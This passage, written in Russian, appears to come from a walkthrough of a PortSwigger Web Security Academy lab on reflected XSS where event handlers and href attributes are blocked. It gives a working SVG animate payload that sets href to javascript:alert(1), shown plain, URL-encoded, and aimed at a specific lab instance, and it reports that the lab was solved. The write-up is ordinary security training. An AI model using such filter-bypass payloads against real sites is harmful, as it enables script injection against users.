Перейдем на уязвимый ресурс, и введем следующий пэйлоад в общем виде
```
https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
В URL кодировке он будет выглядеть следующим образом
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
И в нашем конкретном случае для лабораторной работы в URL кодировке будет выглядеть следующим образом
```
https://0ad400f103292ad180401c50006a00d4.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
И видим, что пэйлоад отработал, и получаем уведомление об успещно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/13.%20Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/pics%20for%20walkthrough/1.png)
